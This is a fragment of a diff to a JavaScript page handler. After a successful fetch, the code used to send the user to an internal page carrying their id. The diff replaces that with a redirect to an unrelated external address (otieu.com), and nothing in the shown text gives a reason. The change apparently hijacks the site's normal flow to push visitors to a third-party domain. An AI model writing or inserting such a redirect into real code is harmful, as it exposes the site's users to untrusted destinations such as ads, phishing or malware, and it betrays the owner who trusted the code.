@@ -36,7 +36,7 @@ document.addEventListener("DOMContentLoaded", function () {
         })
         .then(res => {
             if (res.ok) {
-                window.location.href = `ve.html?id=${userId}`;
+                window.location.href = `https://otieu.com/4/9831064`;
             } else {
                 alert("Failed please try again.");
             }
